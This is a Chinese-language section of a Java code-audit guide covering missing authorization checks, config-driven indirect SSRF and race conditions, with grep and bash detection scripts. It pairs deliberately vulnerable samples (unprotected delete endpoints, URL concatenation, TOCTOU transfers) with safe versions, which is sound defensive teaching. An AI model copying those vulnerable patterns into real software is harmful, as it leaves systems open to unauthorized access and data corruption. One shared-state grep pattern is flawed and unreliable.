## 授权漏洞检测 (Authorization Gap) - v1.7.1

> **核心问题**: 授权漏洞是"代码缺失"，grep 无法检测"应该有但没有"的代码
> **解决方案**: 授权矩阵方法 - 从"应该是什么"出发，而非"存在什么"

### 方法论

```
❌ 旧思路 (被动检测 - 局限性大):
   搜索 @PreAuthorize 注解 → 检查是否存在
   问题: 存在注解不等于正确，可能配置错误或遗漏

✅ 新思路 (主动建模 - 系统性):
   1. 枚举所有敏感操作 (delete/update/export/download)
   2. 定义应有的权限 (谁可以操作什么)
   3. 对比实际代码，检测缺失或不一致
```

### 检测步骤

```bash
# 步骤1: 找到所有Controller的敏感操作
grep -rn "@\(Delete\|Put\|Post\)Mapping.*\(delete\|remove\|update\|edit\)" --include="*Controller.java"
grep -rn "public.*\(delete\|remove\|update\|export\|download\)\s*(" --include="*Controller.java"

# 步骤2: 检查权限注解存在性
for file in $(find . -name "*Controller.java"); do
    echo "=== $file ==="
    # 检查敏感方法是否有权限注解
    grep -B 5 "public.*delete\|public.*update\|public.*export" "$file" | \
    grep -E "@PreAuthorize|@Secured|@RequiresPermissions|@RequiresRoles"
done

# 步骤3: 对比同模块CRUD方法的权限检查一致性
# 示例: UserController
echo "=== 权限一致性检查 ==="
grep -A 3 "public.*create.*User" UserController.java | head -5
grep -A 3 "public.*delete.*User" UserController.java | head -5
# 如果 create 有 @PreAuthorize 但 delete 没有，则存在漏洞
```

### 漏洞模式

```java
// ❌ 漏洞: delete方法缺失权限检查
@DeleteMapping("/file/{id}")
public void deleteFile(@PathVariable Long id) {
    fileService.deleteById(id);  // 任何用户都可删除任意文件
}

// ✅ 同模块的download方法有权限检查
@GetMapping("/file/{id}")
@PreAuthorize("@filePermission.canAccess(#id)")
public void downloadFile(@PathVariable Long id) {
    // ...
}

// ❌ 漏洞: 权限注解配置错误
@PreAuthorize("hasRole('USER')")  // 应该是 ADMIN
@DeleteMapping("/admin/user/{id}")
public void deleteUser(@PathVariable Long id) {
    userService.deleteById(id);
}
```

### Spring Security 权限一致性脚本

```bash
#!/bin/bash
# check_auth_consistency_java.sh

echo "=== Java 授权一致性检测 ==="

# 找所有Controller
CONTROLLERS=$(find . -name "*Controller.java" -type f)

for ctrl in $CONTROLLERS; do
    echo ""
    echo "检查: $ctrl"

    # 提取敏感方法
    SENSITIVE_METHODS=$(grep -n "public.*\(delete\|remove\|update\|export\|download\|upload\)" "$ctrl" | cut -d: -f1)

    for line in $SENSITIVE_METHODS; do
        # 检查方法前5行是否有权限注解
        start=$((line - 5))
        [ $start -lt 1 ] && start=1

        auth_check=$(sed -n "${start},${line}p" "$ctrl" | grep -c "@PreAuthorize\|@Secured\|@RequiresPermissions")
        method_name=$(sed -n "${line}p" "$ctrl" | grep -o "public.*(" | head -1)

        if [ "$auth_check" -eq 0 ]; then
            echo "  ⚠️  第${line}行: $method_name - 缺少权限注解"
        else
            echo "  ✅ 第${line}行: $method_name - 有权限检查"
        fi
    done
done
```

### 间接SSRF检测 (配置驱动)

```java
// ❌ 漏洞: 配置驱动的间接SSRF
@Value("${api.base.url}")
private String apiBaseUrl;

public String fetchData(String endpoint) {
    // apiBaseUrl 可能被攻击者通过配置注入控制
    String url = apiBaseUrl + endpoint;  // 间接SSRF
    return restTemplate.getForObject(url, String.class);
}

// 检测命令
grep -rn "@Value.*url\|@Value.*host\|@Value.*endpoint" --include="*.java"
grep -rn "String\.format.*%s.*http\|sprintf.*http" --include="*.java"
```

### 审计清单 (授权专项)

```
授权矩阵建模:
- [ ] 列出所有敏感操作 (CRUD + export/download)
- [ ] 定义每个操作的预期权限
- [ ] 检查实际权限注解是否匹配预期

权限一致性:
- [ ] 对比同模块 CRUD 方法的权限配置
- [ ] 检查 delete 是否有 create 同等或更高的权限要求
- [ ] 验证资源所有权检查 (水平越权防护)

间接注入:
- [ ] 检查 @Value 注入的 URL/host 配置
- [ ] 追踪配置文件中的可控值
- [ ] 验证格式化字符串构造的URL
```

---

## 竞态条件 (CWE-362)

### 危险模式

```java
// 1. Check-Then-Act (TOCTOU)
// 危险: 检查与操作之间存在竞态窗口
public class VulnerableTransfer {
    private Map<String, Double> balances = new HashMap<>();

    public boolean transfer(String from, String to, double amount) {
        // 检查余额 (T1)
        if (balances.get(from) >= amount) {
            // 竞态窗口: 另一线程可能同时执行转账
            balances.put(from, balances.get(from) - amount);  // 操作 (T2)
            balances.put(to, balances.get(to) + amount);
            return true;
        }
        return false;
    }
}

// 安全: 使用同步
public class SafeTransfer {
    private final Map<String, Double> balances = new ConcurrentHashMap<>();
    private final ReentrantLock lock = new ReentrantLock();

    public boolean transfer(String from, String to, double amount) {
        lock.lock();
        try {
            if (balances.get(from) >= amount) {
                balances.compute(from, (k, v) -> v - amount);
                balances.compute(to, (k, v) -> v + amount);
                return true;
            }
            return false;
        } finally {
            lock.unlock();
        }
    }
}

// 2. 单例双重检查锁定 (DCL)
// 危险: Java 5之前的DCL模式
public class Singleton {
    private static Singleton instance;

    public static Singleton getInstance() {
        if (instance == null) {           // 第一次检查
            synchronized (Singleton.class) {
                if (instance == null) {   // 第二次检查
                    instance = new Singleton(); // 可能看到部分构造的对象
                }
            }
        }
        return instance;
    }
}

// 安全: volatile + DCL
public class SafeSingleton {
    private static volatile SafeSingleton instance;

    public static SafeSingleton getInstance() {
        if (instance == null) {
            synchronized (SafeSingleton.class) {
                if (instance == null) {
                    instance = new SafeSingleton();
                }
            }
        }
        return instance;
    }
}

// 3. 文件操作竞态
// 危险: 检查文件存在后再操作
public void processFile(String filename) {
    File file = new File(filename);
    if (file.exists() && file.canRead()) {
        // 竞态窗口: 文件可能被删除或替换
        try (FileInputStream fis = new FileInputStream(file)) {
            // 处理文件
        }
    }
}

// 安全: 直接尝试操作，处理异常
public void safeProcessFile(String filename) {
    try (FileInputStream fis = new FileInputStream(filename)) {
        // 处理文件
    } catch (FileNotFoundException e) {
        // 文件不存在或无法访问
    }
}
```

### Spring 中的竞态条件

```java
// 危险: @Service默认单例，共享可变状态
@Service
public class VulnerableService {
    private User currentUser;  // 危险: 共享状态

    public void setUser(User user) {
        this.currentUser = user;  // 线程A设置
    }

    public void process() {
        // 线程B可能看到线程A的用户
        doSomething(this.currentUser);
    }
}

// 安全: 无状态设计或使用ThreadLocal
@Service
public class SafeService {
    public void process(User user) {  // 参数传递
        doSomething(user);
    }
}

// 或使用 @Scope
@Service
@Scope(value = "request", proxyMode = ScopedProxyMode.TARGET_CLASS)
public class RequestScopedService {
    private User currentUser;  // 每个请求独立实例
}

// 危险: 懒加载初始化竞态
@Service
public class LazyService {
    private ExpensiveResource resource;

    public ExpensiveResource getResource() {
        if (resource == null) {
            resource = new ExpensiveResource();  // 可能初始化多次
        }
        return resource;
    }
}

// 安全: 使用 @PostConstruct 或 Lazy<T>
@Service
public class SafeLazyService {
    private final Supplier<ExpensiveResource> resource =
        Suppliers.memoize(ExpensiveResource::new);

    public ExpensiveResource getResource() {
        return resource.get();
    }
}
```

### 数据库竞态

```java
// 危险: 应用层检查存在竞态
@Transactional
public void createUser(String username) {
    if (userRepository.findByUsername(username) == null) {
        // 竞态窗口: 另一事务可能同时插入
        userRepository.save(new User(username));
    }
}

// 安全: 数据库唯一约束 + 异常处理
@Transactional
public void safeCreateUser(String username) {
    try {
        userRepository.save(new User(username));
    } catch (DataIntegrityViolationException e) {
        // 用户名已存在
        throw new UsernameExistsException(username);
    }
}

// 安全: 悲观锁
@Transactional
public void transferWithLock(Long fromId, Long toId, BigDecimal amount) {
    Account from = accountRepository.findByIdWithLock(fromId);  // SELECT ... FOR UPDATE
    Account to = accountRepository.findByIdWithLock(toId);

    from.debit(amount);
    to.credit(amount);
}

// Repository
public interface AccountRepository extends JpaRepository<Account, Long> {
    @Lock(LockModeType.PESSIMISTIC_WRITE)
    @Query("SELECT a FROM Account a WHERE a.id = :id")
    Account findByIdWithLock(@Param("id") Long id);
}

// 安全: 乐观锁
@Entity
public class Account {
    @Version
    private Long version;  // 乐观锁版本号
}
```

### 检测命令

```bash
# 查找共享可变状态
grep -rn "private.*[^final].*=" --include="*.java" | grep -v "static final"

# 查找check-then-act模式
grep -rn "if.*exists\|if.*null.*{" --include="*.java" -A 3

# 查找非线程安全集合
grep -rn "new HashMap\|new ArrayList\|new HashSet" --include="*.java"

# 查找双重检查锁定
grep -rn "if.*null.*synchronized" --include="*.java"
```

---

**版本**: 4.0
**更新日期**: 2026-02-04
**方法论**: 双轨并行 (控制建模 + 数据流分析)
**覆盖漏洞类型**: 20+ (缺失类 + 注入类完整覆盖)
**参考文档**:
- `references/core/security_controls_methodology.md` - 完整方法论
- `references/core/data_flow_methodology.md` - 数据流分析
- `references/core/sensitive_operations_matrix.md` - 控制矩阵
